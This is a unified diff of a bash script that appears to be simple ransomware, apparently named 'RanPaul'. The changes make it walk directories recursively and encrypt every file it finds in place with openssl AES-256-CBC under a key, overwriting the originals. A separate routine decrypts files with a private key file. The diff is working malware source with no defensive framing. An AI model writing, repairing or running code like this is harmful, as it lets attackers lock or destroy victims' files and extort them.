@@ -27,7 +27,7 @@ openfile() {
 }
 
 adderr() {
-	ERRMSG="\n$ERRMSG$1"
+	ERRMSG="$ERRMSG\n$1"
 }
 
 EXIT() {
@@ -63,12 +63,12 @@ pck() {
 	openfile $1
 	stuff=$(cat $1)
 	echo "RAN" > $1
-	echo -e "$stuff" | openssl aes-256-cbc -k $KEY -out RanPaul.$1
-	rm -f $1
-	if [[ ! -f RanPaul.$1 && ! -f $1 ]]; then
+	echo -e "$stuff" | openssl aes-256-cbc -k $KEY -out $1
+	if [ ! -f "$1" ]; then
 		adderr "[!] FILE NOT ENCRYPTED"
 		EXIT
 	fi
+	adderr "[+] Encrypted $1"
 }
 #start decrypt
 dec() {
@@ -77,19 +77,17 @@ dec() {
 }
 #unpack
 upk() {
-	outfile=$(echo $1 | cut -c 9-) # 8 characters in RanPaul.
-	openssl aes-256-cbc -d -kfile $PRIVATEKEY -in $1 -out $outfile
-	rm RanPaul.$1
+	openssl aes-256-cbc -d -kfile $PRIVATEKEY -in $1 -out $1.dec
+	mv $1.dec $1
 }
 
 navdir() {
-for fil in $1*; do
+files=( $1 )
+for fil in ${files[@]}; do
 	if [ -f "$fil" ]; then
-		if [ "$2" != "" ]; then
-			$2 $fil
-		fi
+		$2 $fil
 	elif [ -d "$fil" ]; then
-		navdir "$fil/"
+		navdir "$fil/*" "$2"
 	fi
 done
 }
@@ -97,5 +95,6 @@ done
 check_req
 init
 for i in $@; do
-	navdir $i "pck"
+	navdir "$i*" "pck"
 done
+EXIT
